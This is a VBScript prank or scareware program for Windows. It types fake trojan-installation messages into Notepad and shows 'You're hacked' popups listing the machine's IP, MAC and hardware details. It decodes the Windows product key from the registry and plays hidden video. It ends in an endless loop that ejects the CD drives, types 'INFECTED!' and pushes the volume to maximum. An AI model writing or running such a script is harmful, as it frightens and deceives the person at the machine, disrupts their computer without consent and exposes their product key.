On Error Resume Next

Sub Volume
Set WshShell = CreateObject("WScript.Shell")
For i= 1 To 110
WshShell.SendKeys chr(175) ' monte le volume
Next
End Sub

Sub ouvrirlecteur
Set FSO = CreateObject("WMPlayer.OCX.7")
Set FSO2 = FSO.cdromCollection
For e=0 to FSO2.count-1
FSO2.Item(e).Eject
FSO2.Item(e).Eject
next
End Sub

Set WshShell = CreateObject("WScript.Shell")
For i = 1 To 20  
WshShell.SendKeys chr(175) ' monte le volume
Next 

set variable=CreateObject("WScript.Shell") 
variable.Run("C:\WINDOWS\System32\notepad.exe") 
wscript.sleep 1050 

For i = 1 To 80
variable.SendKeys (" ") 
wscript.sleep 15 
variable.SendKeys (".") 
wscript.sleep 15 
Next
wscript.sleep 15 
wscript.sleep 15 
variable.SendKeys ("{enter}") 
wscript.sleep 150 
variable.SendKeys ("connecting in your Computer .... ")
variable.SendKeys ("{enter}")
variable.SendKeys ("connecting in your Computer .... ")
variable.SendKeys ("{enter}") 
variable.SendKeys ("connecting in your Computer .... ") 
variable.SendKeys ("{enter}")
wscript.sleep 150 
wscript.sleep 150 
wscript.sleep 150 

For i = 1 To 80
variable.SendKeys (" ") 
wscript.sleep 15 
variable.SendKeys (".") 
wscript.sleep 15 
Next

wscript.sleep 30
variable.SendKeys ("{enter}") 
wscript.sleep 150 
variable.SendKeys ("connecting success !") 
variable.SendKeys ("{enter}")
wscript.sleep 1000
variable.SendKeys ("{enter}") 
wscript.sleep 150 
variable.SendKeys ("{enter}") 
variable.SendKeys ("Trojan-IM.Win.A-20 : install file ...") 
wscript.sleep 150 
variable.SendKeys ("{enter}") 
wscript.sleep 150 
variable.SendKeys ("{enter}") 
For i = 1 To 80
variable.SendKeys (" ") 
wscript.sleep 15 
variable.SendKeys (".") 
wscript.sleep 15 
Next
wscript.sleep 150 
variable.SendKeys ("{enter}") 
wscript.sleep 150 
variable.SendKeys ("Trojan-IM.Win.A-20 : install file complete") 
variable.SendKeys ("{enter}") 
variable.SendKeys ("{enter}") 

wscript.sleep 2000
Set WshShell = Nothing  

CreateObject("WScript.Shell").Run "http://www.fallingfalling.com/"
wscript.sleep 4000
CreateObject("Wscript.Shell").Run "C:\WINDOWS\System32\notepad.exe" ,vbhyde

WScript.Sleep 9500
Set oShell = CreateObject("wscript.Shell")
Set env = oShell.environment("Process")
strComputer = env.Item("Computername")
Dim objWMIService
Dim colItems, objItem
Set objWMIService = GetObject("winmgmts:\\"&  strComputer & "\root\cimv2")
Set colItems = objWMIService.ExecQuery _
("Select * from Win32_OperatingSystem")
set IPConfigSet = GetObject("winmgmts:{impersonationLevel=impersonate}!//" & Computer).ExecQuery _ 
("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=TRUE") 
for each IPConfig in IPConfigSet 
Set oShell = CreateObject("wscript.Shell")
Set env = oShell.environment("Process")
strComputer = env.Item("Computername")
strComputer = "."
' WMI Connection to the object in the CIM namespace
Set objWMIService = GetObject("winmgmts:\\" _
& strComputer & "\root\cimv2")
' WMI Query to the Win32_OperatingSystem
Set colItems = objWMIService.ExecQuery _
("Select * from Win32_OperatingSystem")
' For Each... In Loop (Next at the very end)
For Each objItem in colItems 
oShell.Popup  " Editeur " & vbtab & vbtab & " : " & objItem.Manufacturer & VbCr & " Systeme " & vbtab & vbtab & " : " & objItem.Caption & VbCr & " Version " & vbtab & vbtab & " : " & objItem.Version & VbCr & " Processor " & vbtab & vbtab & " : " & objItem.Description & VbCr & " GUID " & vbtab & vbtab & " : " & objItem.SerialNumber & VbCr & " Carte " & vbtab & vbtab & " : " & IPConfig.Description & vbcrlf & " adresse MAC " & vbtab & " : " & IPConfig.MACAddress & vbcrlf & " CodeSet " & vbtab & " : " & objItem.CodeSet & VbCr & " adresse IP " & vbtab & " : " & IPConfig.IPAddress(0) & vbcrlf & " Machine Name " & vbtab & " : " & objItem.CSName & VbCr & " WindowsDirectory " & vbtab & " : " & objItem.WindowsDirectory & VbCr &  " SystemDrive " & vbtab & " : " & objItem.SystemDrive & VbCr & " DNSHostName " & vbtab & " : " & IPConfig.DNSHostName,5,"You're hacked"
    Next
strComputer = "."
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
Set colItems = objWMIService.ExecQuery _
("Select * from Win32_DisplayConfiguration")
For Each objItem in colItems
Set oShell = WScript.CreateObject("WScript.Shell") 
oShell.Popup " Qualité couleur " & vbtab & vbtab & " : " & objItem.BitsPerPel & VbCr & " Carte graphique " & vbtab & vbtab & " : " & objItem.DeviceName & VbCr & " Fréquence du moniteur " & vbtab & vbtab & " : " & objItem.DisplayFrequency & VbCr & " Version du driver " & vbtab & vbtab & " : " & objItem.DriverVersion & VbCr & " Hauteur en pixels " & vbtab & vbtab & " : " & objItem.PelsHeight & VbCr & " Largeur en pixels " & vbtab & vbtab & " : " & objItem.PelsWidth,10,"You're hacked"
    Next 
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
& "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set colSettings = objWMIService.ExecQuery _
("Select * from Win32_ComputerSystem")

For Each objComputer in colSettings 
oShell.Popup " Fabriquant " & vbtab & vbtab & " : " & objComputer.Manufacturer & VbCr & " Model:" & vbtab & " : " & objComputer.Model,10,"You're hacked"
Next

Set oShell = CreateObject("wscript.Shell")
Set env = oShell.environment("Process")
strComputer = env.Item("Computername")

Set oShell = CreateObject("wscript.Shell")
Set env = oShell.environment("Process")
strComputer = env.Item("Computername")
strComputer = "."
' WMI Connection to the object in the CIM namespace
Set objWMIService = GetObject("winmgmts:\\" _
& strComputer & "\root\cimv2")
' WMI Query to the Win32_OperatingSystem
Set colItems = objWMIService.ExecQuery _
("Select * from Win32_OperatingSystem")
strComputer = "."
Set colSettings3 = objWMIService.ExecQuery ("Select * from Win32_OperatingSystem") 
For Each objOperatingSystem in colSettings3 
oShell.Popup " Version " & vbtab & " : " & objOperatingSystem.Version & VbCr & " Dossier de Windows " & vbtab & " : " & objOperatingSystem.WindowsDirectory & VbCr &  " Service Pack " & vbtab & " : " & objOperatingSystem.ServicePackMajorVersion & "." & objOperatingSystem.ServicePackMinorVersion,10,"You're hacked"
    Next
Next

Dim objFS, objShell
Dim strXPKey

Set objShell = CreateObject("WScript.Shell")

strXPKey = objShell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName")
If Len(strXPKey) > 0 Then
    WScript.Echo "Clé=" & chr(34) & GetKey(objShell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\DigitalProductId")) & chr(34)
  End If
Function GetKey(rpk)
  Const rpkOffset=52:i=28
  szPossibleChars="BCDFGHJKMPQRTVWXY2346789"
  Do
    dwAccumulator=0 : j=14
    Do
      dwAccumulator=dwAccumulator*256
      dwAccumulator=rpk(j+rpkOffset)+dwAccumulator
      rpk(j+rpkOffset)=(dwAccumulator\24) and 255
      dwAccumulator=dwAccumulator Mod 24
      j=j-1
    Loop While j>=0
    i=i-1 : szProductKey=mid(szPossibleChars,dwAccumulator+1,1)&szProductKey
    if (((29-i) Mod 6)=0) and (i<>-1) then
      i=i-1 : szProductKey="-"&szProductKey
    End If
  Loop While i>=0
  GetKey=szProductKey
End Function

URL = "https://www.youtube.com/embed/uK4-nUZiOH4?rel=0;showinfo=0;controls=0;iv_load_policy=3;autoplay=1;"
Set ie = CreateObject("InternetExplorer.Application")
Set objFSO = CreateObject("Scripting.FileSystemObject") 
ie.Navigate (URL) 
ie.Visible=False

wscript.sleep 15000

Sub VIRUS
wscript.sleep 200
variable.SendKeys ("INFECTED!")
End Sub

do
ouvrirlecteur
VIRUS
Volume
loop